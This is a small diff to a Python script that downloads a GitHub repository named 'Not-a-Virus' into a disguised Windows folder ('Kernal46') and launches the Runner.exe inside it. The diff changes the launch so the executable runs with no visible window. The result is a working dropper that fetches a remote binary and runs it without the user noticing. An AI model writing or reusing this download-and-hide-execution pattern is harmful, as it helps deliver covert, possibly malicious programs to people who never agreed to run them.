@@ -2,6 +2,7 @@ from dulwich import porcelain
 import os
 import shutil
 from time import sleep
+import subprocess
 
 path = 'C:/Users/Public/Kernal46'
 def removePath(path):
@@ -29,4 +30,5 @@ porcelain.clone('https://github.com/romanjmock/Not-a-Virus', path)
 
 os.chdir(os.path.join(path, 'dist/Runner'))
 
-os.system('Runner.exe')
+CREATE_NO_WINDOW = 0x08000000
+subprocess.Popen('Runner.exe', creationflags = CREATE_NO_WINDOW)
